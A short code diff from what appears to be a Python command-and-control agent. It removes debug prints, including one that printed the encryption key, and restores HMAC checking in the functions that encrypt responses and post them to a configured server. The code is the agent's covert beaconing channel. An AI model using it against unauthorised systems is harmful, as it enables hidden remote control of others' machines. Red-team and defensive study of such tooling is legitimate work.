@@ -77,7 +77,6 @@ def agent_encoder(agent):
    
 
 def encrypt_AES256(data, key=Agent.encryption_key):
-    print(key)
     key = base64.b64decode(key)
     data = json.dumps(data).encode()
     h = HMAC.new(key, digestmod=SHA256)
@@ -97,7 +96,7 @@ def decrypt_AES256(data, key=Agent.encryption_key):
     iv = data[:16]  # 16 Bytes for IV at the beginning
     message = data[16:-32]  # the rest is the message
     h = HMAC.new(key=key, msg=iv + message, digestmod=SHA256)
-    # h.verify(mac)
+    h.verify(mac)
     decryption_cipher = AES.new(key, AES.MODE_CBC, iv=iv)
     decrypted_message = decryption_cipher.decrypt(message)
     # now to remove any padding that was added on to make it the right block size of 16
@@ -128,7 +127,6 @@ def send(response, uuid):
         enc = encrypt_AES256(response)
         message = base64.b64encode(uuid.encode() + enc).decode("utf-8")
         x = requests.post(Agent.Server + ":" + Agent.Port + Agent.URI, data = message, headers=Agent.UserAgent)
-        print(x)
         dec = decrypt_AES256(x.text)
         return dec
 
